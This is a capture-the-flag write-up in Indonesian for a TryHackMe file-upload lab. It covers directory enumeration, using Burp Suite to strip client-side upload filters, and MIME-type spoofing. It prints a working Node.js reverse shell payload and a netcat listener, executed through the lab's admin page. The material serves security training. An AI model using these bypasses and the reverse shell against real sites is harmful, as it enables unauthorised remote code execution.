# Upload Vuln Challenge

[challenge is here](https://tryhackme.com/room/uploadvulns)

lakukan scanning direktori pada web dengan gobuster ke jewel.uploadvuln.thm dengan cara
```shell
gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirb/big.txt  -t 250
```

hasilnya seperti berikut
```shell
...
/Admin                (Status: 200) [Size: 1238]
/ADMIN                (Status: 200) [Size: 1238]
/Content              (Status: 301) [Size: 181] [--> /Content/]
/admin                (Status: 200) [Size: 1238]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/content              (Status: 301) [Size: 181] [--> /content/]
/modules              (Status: 301) [Size: 181] [--> /modules/]
/secci�               (Status: 400) [Size: 1092]
...
```

dari hasil enumerating dir tersebut, didapat 3 buah dir yang menarik, yaitu `/admin` yang mana dalam hal ini dapat digunakan untuk mengeksekusi modules. `/content` merupakan tempat dimana file kita terupload. `/modules` dimana kita menaruh file module yang dapat dieksekusi pada saat kita mengunjungi admin.

selanjutnya buka burpsuite. lakukan intercept dan kirim ke repeater. hasil response adalah seperti berikut:

```shell
HTTP/1.1 304 Not Modified
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 14 Oct 2023 10:39:25 GMT
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 03 Jul 2020 20:57:40 GMT
ETag: W/"5ea-173167875a0"
Front-End-Https: on
```

kita dapat foklus ke bagian `Server` dan `X-Powered-By`, dimana server yang digunakan adalah Ubuntu Server dan berjalan dengan Express yang mana adalah backend framework built on Node.js, intinya berbasis javascript.

selanjutnya kita lihat source code nya dengan cara `view page source` di firefox.

```html
...
<script src="assets/js/upload.js"></script>
...
...
<main>
			<object ondragstart="return false;" ondrop="return false;" id="title" data="/assets/title.svg" type="image/svg+xml"></object>
			<p>Have you got a nice image of a gem or a jewel?<br>Upload it here and we'll add it to the slides!</p>
			<button class="Btn" id="uploadBtn"><i id="uploadIcon" class="material-icons">backup</i> Select and Upload</button>
			<input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">
		</main>
...
```

dapat dilihat bahwa file yang dapat diterima oleh website hanyalah yang berformat `jpg`, selain itu ada juga file `upload.js`, kita dapat melihat source code js nya juga

```js
...
			//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}
...
```

selain hanya menerima file berekstensi jpg, ternyata web ini juga memiliki filter file size dan juga magic number. namun semua filter tersebut terjadi di client side, yang mana kita dapat bypass dengan mengedit source code nya.

selanjutnya, kita dapat mencoba upload file dengan ekstensi yang benar, dan karena filenya secara ekstensi dan magic number adalah benar, maka file akan sukses terupload. namun untuk ekstensi selain jpg akan gagal.

untuk mencari file yang telah kita upload, kita dapat menggunakan gobuster lagi, namun kali ini dengan menggunakan wordlists yang telah disediakan oleh tryhackme, dan fokus secara spesifik di `jewel.uploadvuln.thm/content` karena kita tahu bahwa file akan otomatis berada di `/content`.

```shell
gobuster dir -u http://jewel.uploadvulns.thm/content -w ~/Downloads/UploadVulnsWordlist.txt -x jpg
```

hasilnya akan berisi nama-nama random, yang kita bisa cek dengan mengunjunginya langsung. contoh `jewel.uploadvulns.thm/content/ARE.jpg`

```shell
...
/ABH.jpg              (Status: 200) [Size: 705442]
/ARE.jpg              (Status: 200) [Size: 15946]
...
```

selanjutnya kita akan memodifikasi `request interception rule` yang ada di burpsuite. kita edit bagian file extension dengan menghapus ekstensi `|^js$|`.

selanjutnya kita dapat intercept lagi lewat burpsuite, pada bagian `../assets/js/upload.js`, dengan cara klik kanan pada intercept messages lalu pilih `Do Intercept>Response to this requests`, selanjutnya edit dengan menghapus function berikut

```js
...
reader.onload=function(event){

			//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}

const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};
...
```

menjadi

```js
...
reader.onload=function(event){

const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};
...
```

lalu forward. lakukan juga pada bagian index.html dengan menghapus

```html
...
</button>
			<input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">
		</main>
...
```

menjadi

```html
...
</button>
			<input id="fileSelect" type="file" name="fileToUpload">
		</main>
...
```

hal itu akan menyebabkan filter ekstensi pada client side hilang.

selanjutnya kita dapat melakukan percobaan untuk menebak apa filter yang digunakan pada server side. dengan cara:

- upload file dengan extensi random (contoh: gambar.jpgitugambar)
- upload file yang telah diubah magic numbernya (contoh: gambar.jpg tapi memiliki magic number .gif)
- MIME type atau mengganti ekstensi saat di intercept

hasil:

- server side menggunakan whitelist filter daripada blacklist filter
- server side tidak menggunakan magic number filter
- MIME type tentu berhasil jika jadi `image/jpg` selain itu akan invalid, sehingga MIME type filter aktif dalam server side

selanjutnya, kita akan gunakan payload untuk revshell. karena kita tahu service yang digunakan adalah berbasiskan js, maka kita memerlukan payload js. payload dapat diambil dari [sini](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md?source=post_page-----32f7b2e555c3--------------------------------#nodejs).

copy payload dan edit port serta ip menjadi ip `tun0`

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(PORT, "IP_tun0_local", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

lalu simpan dengan format `shell.js`.

selanjutnya hidupkan intercept sebelum upload file. selanjutnya kita upload file `shell.js` tersebut. kita tidak perlu menggantinya filetypenya, daripada itu, kita dapat menggantinya saat POST request saat upload file dengan mengganti MIME type di burpsuite.

```html
...
"name":"shell.js",
"type":"text/javascript",
...
```

menjadi

```html
...
"name":"shell.jpg",
"type":"image/jpeg",
...
```

dan selanjutnya forward. nantinya akan berhasil. setelah itu kita enumerate lagi dengan menggunakan gobuster untuk mencari file yang barusan kita upload

```shell
gobuster dir -u http://jewel.uploadvulns.thm/content -w ~/Downloads/UploadVulnsWordlist.txt -x jpg
```

hasilnya

```shell
...
/ABH.jpg              (Status: 200) [Size: 705442]
/ARE.jpg              (Status: 200) [Size: 15946]
/BNQ.jpg              (Status: 200) [Size: 15946]
/GTH.jpg              (Status: 200) [Size: 383]
...
```

kita dapat langsung fokus dengan file yang memiliki size kecil karena file payload kita hanya berisi text. selanjutnya kita pergi ke `../admin` page untuk mengeksekusi payload. selanjutnya kita siapkan dulu netcat listener dengan cara `nc -lvnp PORT` dengan port yang sudah kita set pada payload. selanjutnya kita dapat eksekusi payload dengan mengisi input `../content/nama_file.jpg`, nantinya jika berhasil netcat akan terkoneksi dan kita akan mendapatkan shell session, gunakan shell tersebut untuk mendapatkan flag di `/var/www`.